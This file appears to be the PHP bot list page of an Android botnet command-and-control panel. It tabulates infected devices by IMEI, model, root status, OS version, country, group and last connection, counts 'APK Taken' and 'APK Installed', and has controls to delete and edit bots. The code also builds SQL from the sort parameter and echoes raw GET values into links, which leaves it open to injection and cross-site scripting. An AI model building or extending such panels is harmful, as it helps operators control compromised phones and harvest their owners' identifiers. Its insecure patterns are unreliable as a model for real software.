<?php include 'check_sess_1.php';?>
<?php
if (!isset($_GET['sort']) || $_GET['sort'] == ""){
	$sort = 'last_connect';
}
else{
	$sort = mysql_escape_string($_GET['sort']);
}

$query = "SELECT count(*) FROM `devices` WHERE 1";
$result = $mysqli->query($query);
$users_on_page="20";

$count = $result->fetch_assoc()['count(*)'];
$total = ceil($count / $users_on_page);

if(empty($_GET["p"])){
	$_GET["p"] = 1;
}

$p = (int) $_GET["p"];

$where = array();
if(isset($_GET['filter_online']))
{
	$where[] = "last_connect > (DATE_SUB(CURDATE(), INTERVAL 4 HOUR))";
}

if(isset($_GET['filter_by_group']))
{
	$group = mysql_escape_string($_GET['filter_by_group']);
	if(trim($group))
		$where[] = "group_id='{$group}'";
}

if($where)
	$where = 'WHERE ' . implode(" and ", $where);
else
	$where = '';
	
$first = $p*$users_on_page-$users_on_page;
$query2 = "select * from `devices` {$where} ORDER BY `{$sort}` DESC limit $first, $users_on_page ";
//~ echo $query2;
$result2 = $mysqli->query($query2);

?>

<div class="demo-charts mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid" style="background-color: #37474f;">	
<script>
$(document).ready(function() {
    get_online();
});
</script>
 <div class="mdl-cell mdl-cell--6-col">
<h4 style='color: white'>Who was online</h4>
 <table class="mdl-data-table mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
  <tbody>
    <tr>
      <td class="mdl-data-table__cell--non-numeric">This week:</td>
      <td class="mdl-data-table__cell--non-numeric"><span  id="week"></span></td>
	   <td class="mdl-data-table__cell--non-numeric">Today:</td>
      <td class="mdl-data-table__cell--non-numeric"><span id="day"></span></td>
<!--
	  <td class="mdl-data-table__cell--non-numeric">In last Hour:</td>
      <td class="mdl-data-table__cell--non-numeric"><span id="lasthour"></span></td>
-->
	  <td class="mdl-data-table__cell--non-numeric">Now:</td>
      <td class="mdl-data-table__cell--non-numeric"><span id="lasthour"></span></td>
	  <td class="mdl-data-table__cell--non-numeric">Total bots:</td>
	  <td class="mdl-data-table__cell--non-numeric"><span  id="total"><?php echo $count ; ?></span></td>
    </tr>
   
  </tbody>
</table>
</div>



</div>


<div  class="demo-charts mdl-color--white mdl-shadow--2dp mdl-cell mdl-cell--12-col mdl-grid">

Sort by
&nbsp;&nbsp;
<select id="sort" name="sort" onchange='location.href="index.php?command=botlist&sort="+this.options[this.selectedIndex].value'>
<?php
$opts = array(
	'last_connect'=>'Last Connect',
	'id'=>'ID',
	//~ 'uniqnum'=>'Unique ID',
	'model'=>'Model',
	'root'=>'Root',
	'osver'=>'OS version',
	'country'=>'Country',
);
foreach($opts as $key=>$name)
{
	$sel = (isset($_GET['sort']) && $_GET['sort'] == $key)? 'selected' : '';
	echo "<option value='{$key}' {$sel}>{$name}</option>\n";
	// onclick='location.href=\"index.php?command=botlist&sort={$key}\"'
}
?>
</select>
&nbsp;&nbsp;
<?php
if(isset($_GET['filter_online']))
	echo "<a href='index.php?command=botlist'>Show all</a>";
else
	echo "<a href='index.php?command=botlist&filter_online=1'>Show online</a>";
?>
<!--
<button style="margin-left: 10px;" class="mdl-button mdl-js-button mdl-button--raised" onclick="location.href='index.php?command=botlist&sort=' + $('#sort').val();">
  Sort <i class="material-icons">sort</i>
</button>
-->

</div>

<?php
$group_list = 'Group';
$gr_res = $mysqli->query("select group_id from devices where group_id<>'' group by group_id");
$html = <<<PHP
	Group<br /><select onchange='location.href="?command=botlist&filter_by_group="+this.options[this.selectedIndex].value'>
	<option value=''>All</option>
PHP;

$c = 0;
while($gr_row = @mysqli_fetch_assoc($gr_res)) 
{
	$sel = (isset($_GET['filter_by_group']) && $_GET['filter_by_group'] == $gr_row['group_id'])? " selected " : "";
	$html .= "<option {$sel}>{$gr_row['group_id']}</option>";
	$c++;
}
$html .= '</select>';

if($c)
	$group_list = $html;
?>
<style type='text/css'>
#bots TH, #bots TD {
	text-align: center;
}
</style>

<table id='bots' style="margin: 0 auto; margin-bottom: 20px; margin-top: 20px;" class="mdl-data-table mdl-js-data-table  mdl-shadow--2dp">
  <thead>
    <tr>
      <th>ID</th>
	  <th>IMEI</th>
	  <th>Model</th>
	  <th>Root</th>
	  <th>OS</th>
	  <th>Country</th>
	  <th><?php echo $group_list; ?></th>
	  <th>Last Connect</th>
	  <th>Actions</th>
    </tr>
  </thead>
  <tbody>
<?php  

function get_time_icon($mysql_ts)
{
	$min10 = 60 * 10;
	$min30 = 60 * 30;
	$h2 = 60 * 120;
	$h5 = 60 * 300;
	$h10 = 60 * 600;

	$delta = time() - strtotime($mysql_ts);
	$indicator_bg = "black";
	$time_name = 'Offline';
	
	if($delta<$min10){
		$indicator_bg = "#53FF1A";
		$time_name = 'Ten minutes ago';
	}else if(($delta >= $min10) && ($delta < $min30)){
		$indicator_bg = "#B3F50B";
		$time_name = 'Thirty minutes ago';
	}else if(($delta >= $min30) && ($delta < $h2)){
		$indicator_bg = "#FFFF5F";
		$time_name = 'Two hours ago';
	}else if(($delta >= $h2) && ($delta < $h5)){
		$indicator_bg = "#FF1E00";
		$time_name = 'Five hours ago';
	}else if(($delta >= $h5) && ($delta < $h10)){
		$indicator_bg = "#7C2216";
		$time_name = 'Ten hours ago';
	}

	$indicator = "<div style=\"display: inline-block;width: 14px;height: 14px;border-radius: 50%;background-color: {$indicator_bg}\" title='Last online {$mysql_ts}. {$time_name}'></div>";
	return $indicator;
}

$i = 1;
while($row = @mysqli_fetch_assoc($result2)) 
{
	$last_connect = get_time_icon($row['last_connect']);
	if($row['group_id'] != 'none')
	{
		$url = '?';
		$found = false;
		foreach($_GET as $k=>$v)
		{
			if($k == 'filter_by_group')
			{
				$v = $row['group_id'];
				$found = true;
			}
			
			$url .= "{$k}={$v}&";
		}
		
		if(!$found)
			$url .= "&filter_by_group=" . $row['group_id'];

		$group = "<a href='{$url}' title='Filter by group name'>{$row['group_id']}</a>";
	}else
		$group = '';
	
	if($row['root'] == 1)
		$root = 'Yes';
	else if($row['root'] == 2)
		$root = 'No';
	
	$country = strtoupper($row['country']);
	if(!file_exists("flags/{$country}.png"))
		$country = '_unknown';
		
	$flag = "<img src='flags/{$country}.png' title='Country {$country}' />";
	
	echo '<tr>
 <td>' . $row['id'] . '</td>
 <td>' . $row['imei'] . '</td>
 <td>' . $row['model'] . '</td>
 <td>' . $root . '</td>
 <td>' . $row['osver'] . '</td>
 <td>' . $flag . '</td>
 <td>' . $group . '</td>
 <td style="text-align: center">' . $last_connect . '</td>
 <td> 
	<button onclick="bot_del('.$row['id'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
	<i class="material-icons">delete</i>
	</button> 
</td>
<td> 
	<button onclick="bot_edit_get('.$row['id'].')" style="min-width: 30px; height: 30px;width: 30px;" class="mdl-button mdl-js-button mdl-button--fab">
	<i class="material-icons">more_horiz</i>
	</button> 
</td>
</tr>';
}
?>

 </thead>
  <tbody>
    
   
  </tbody>
</table>


<?php

if($total>1):
	#2 back
	print "<div class='mdl-layout'>";
	print "<br><div>";
	if(($p-2)>0):
	  $ptwoleft="<a class='first_page_link' href='index.php?command=botlist&p=".($p-2)."'>".($p-2)."</a>  ";
	else:
	  $ptwoleft=null;
	endif;
			
	#1 back
	if(($p-1)>0):
	  $poneleft="<a class='first_page_link' href='index.php?command=botlist&p=".($p-1)."'>".($p-1)."</a>  ";
	  $ptemp=($p-1);
	else:
	  $poneleft=null;
	  $ptemp=null;
	endif;
			
	#2 next
	if(($p+2)<=$total):
	  $ptworight="  <a class='first_page_link' href='index.php?command=botlist&sort={$sort}&p=".($p+2)."'>".($p+2)."</a>";
	else:
	  $ptworight=null;
	endif;
			
	#1 next
	if(($p+1)<=$total):
	  $poneright="  <a class='first_page_link' href='index.php?command=botlist&sort={$sort}&p=".($p+1)."'>".($p+1)."</a>";
	  $ptemp2=($p+1);
	else:
	  $poneright=null;
	  $ptemp2=null;
	endif;		
			
	# to start
	if($p!=1 && $ptemp!=1 && $ptemp!=2):
	  $prevp="<a href='index.php?command=botlist&sort={$sort}&p=1' class='first_page_link' title='To start'><<</a> ";
	else:
	  $prevp=null;
	endif;   
			
	# to end
	if($p!=$total && $ptemp2!=($total-1) && $ptemp2!=$total):
	  $nextp=" ...  <a href='index.php?command=botlist&sort={$sort}&p=".$total."'".$total."' class='first_page_link'>$total</a>";
	else:
	  $nextp=null;
	endif;
		
	print "".$prevp.$ptwoleft.$poneleft.'<span class="num_page_not_link"><b>'.$p.'</b></span>'.$poneright.$ptworight.$nextp; 
	print "</div>";
	print "</div></div>";
endif;

?>

<div id="ModalEditBot" class="modal" style="width:30%; top: 100px; left: 250px;">
    <div class="modal-header">
       
					<button onclick="$('#ModalEditBot').hide();" style="min-width: 30px; height: 30px;width: 30px; left: 95%;" class="mdl-button mdl-js-button mdl-button--fab">
					<i class="material-icons">close</i>
					</button> 
				 
				 
        <h3 id="myModalLabelBot1" style='color: white'>Edit bot details: </h3>
    </div>
    <div class="modal-body" >
				
				<div>
					<input type="hidden" id="real_bot_id">
					
					<table class="mdl-data-table mdl-js-data-table mdl-data-table--selectable mdl-shadow--2dp">
  <thead>
    
  </thead>
  <tbody>
    
  </thead>
  <tr>
	<th>Stat:</th>
	 </tr>
    <tr>
      <td class="mdl-data-table__cell--non-numeric">ID</td>
      <td class="mdl-data-table__cell--non-numeric" id="uniqid_show"></td>
    </tr>
	<tr>
      <td class="mdl-data-table__cell--non-numeric">APK Taken</td>
       <td class="mdl-data-table__cell--non-numeric" id="taken_show"></td>
    </tr>
    <tr>
      <td class="mdl-data-table__cell--non-numeric">APK Installed</td>
       <td class="mdl-data-table__cell--non-numeric" id="installed_show"></td>
    </tr>
	<tr>
	<th>Info:</th>
	 </tr>
	 <tr>
      <td class="mdl-data-table__cell--non-numeric">Model</td>
       <td class="mdl-data-table__cell--non-numeric" id="model_show"></td>
    </tr>
	 <tr>
      <td class="mdl-data-table__cell--non-numeric">Country</td>
       <td class="mdl-data-table__cell--non-numeric" id="country_show"></td>
    </tr>
	 <tr>
      
	  <td class="mdl-data-table__cell--non-numeric">Group:</th>
	  <td class="mdl-data-table__cell--non-numeric"><label for="bot_edit_group"></label> <input class="edit-task" type="text" id="bot_edit_group"></th>
    </tr>
	
  </tbody>
</table>
</div>
</div>
	
    <div class="modal-footer" style='text-align: center'>
        <button onclick="bot_edit_save();" class="mdl-button mdl-js-button mdl-button--raised" style="margin-top: 20px; background-color: white">
		<i class="material-icons">save</i> Save
		</button>
    </div>
</div>
